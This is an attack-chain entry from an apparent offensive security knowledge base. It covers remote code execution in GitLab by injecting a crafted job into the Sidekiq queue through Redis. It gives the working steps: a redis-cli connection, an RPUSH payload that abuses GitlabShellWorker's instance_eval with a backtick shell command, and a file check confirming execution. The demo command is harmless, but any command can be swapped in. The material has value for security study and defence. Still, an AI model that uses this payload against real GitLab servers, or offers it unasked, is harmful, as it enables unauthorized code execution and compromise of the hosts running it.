---
id: ac-gitlab-sidekiq-rce
tags:
  - rce
  - gitlab
  - sidekiq
  - redis
  - ruby
type: attack_chain
tools:
  - '[[tools/Redis-CLI]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Enqueue-Malicious-GitLab-Sidekiq-Job]]'
step_count: 3
techniques:
  - '[[Command-Line Interface]]'
  - '[[Python]]'
updated_at: '2025-12-14T17:23:19.491Z'
description: >-
  Multi-stage attack exploiting GitLab's Sidekiq job queue to achieve remote
  code execution by enqueuing malicious jobs via Redis access.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Python]]'
---
# GitLab RCE via Sidekiq Job Queue Manipulation

Multi-stage attack chain demonstrating remote code execution in GitLab by manipulating the Sidekiq job queue through Redis access. The vulnerability in GitlabShellWorker allows arbitrary method invocation, such as instance_eval, leading to code execution as the GitLab user. Discovered via code review of Git commit 6c65b63ca5 and tested on Bitnami GitLab CE 9.0.5-0 on Ubuntu 14.04.5. Requires prior Redis access, limiting net risk.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Redis Access] --> B[Enqueue Malicious Job]
    B --> C[Worker Execution and RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Redis-CLI]]

### Target Environment

- Target OS/Platform: Linux (Ubuntu 14.04.5 or similar)
- Required services/ports: Redis (default port 6379)
- Network access requirements: Local or remote access to the Redis instance backing GitLab's Sidekiq queue

### Initial Access Requirements

- Credential requirements: Redis credentials or unauthenticated access if not secured
- Network position: Direct connectivity to Redis server
- Prior access needed: Administrative privileges on Redis, which already imply significant compromise

## Detailed Attack Procedures

### Step 1: Access Redis CLI
procedure: [[procedures/Enqueue-Malicious-GitLab-Sidekiq-Job]]

**Objective**: Connect to the Redis instance to interact with the Sidekiq job queue.

**Instructions**: Use [[commands/redis-cli-connect]] to establish a connection to the Redis server used by GitLab.

```bash
redis-cli -h localhost -p 6379
```

**Expected Output**: Successful connection prompt (e.g., `localhost:6379>`).

**Success Indicators**:
- Redis CLI session established
- Ability to execute Redis commands without errors

### Step 2: Enqueue Malicious Job
procedure: [[procedures/Enqueue-Malicious-GitLab-Sidekiq-Job]]

**Objective**: Push a malicious job payload to the gitlab_shell queue, targeting GitlabShellWorker with instance_eval for arbitrary code execution.

**Instructions**: Within the Redis CLI, execute [[commands/rpush-gitlab-shell-job]] to enqueue the payload.

```bash
rpush 'resque:gitlab:queue:gitlab_shell' '{"class":"GitlabShellWorker","args":["instance_eval","`touch /tmp/rce-demo`"],"jid":"Zaep6UXu","enqueued_at":1493166403.21}'
```

**Expected Output**: RPUSH returns the new queue length (e.g., `(integer) 1`); job is enqueued for processing.

**Success Indicators**:
- Queue length increases
- No Redis errors during enqueue

### Step 3: Worker Processes Job
procedure: [[procedures/Enqueue-Malicious-GitLab-Sidekiq-Job]]

**Objective**: Wait for the Sidekiq worker to process the job, resulting in arbitrary code execution as the GitLab user.

**Instructions**: Monitor the Sidekiq logs or wait briefly for processing. Verify execution by checking for the created file using [[commands/ls-tmp-rce]].

```bash
ls /tmp/rce-demo
```

**Expected Output**: File `/tmp/rce-demo` exists if execution succeeded.

**Success Indicators**:
- File created at `/tmp/rce-demo`
- Sidekiq job logs show processing without errors

## Attack Chain Summary

### Key Achievements

1. Gained access to GitLab's internal job queue via Redis
2. Enqueued a payload exploiting GitlabShellWorker's lack of method whitelisting
3. Achieved RCE as the GitLab application user, demonstrating file creation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Python]] Ruby

### MITRE ATT&CK Tactics

- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
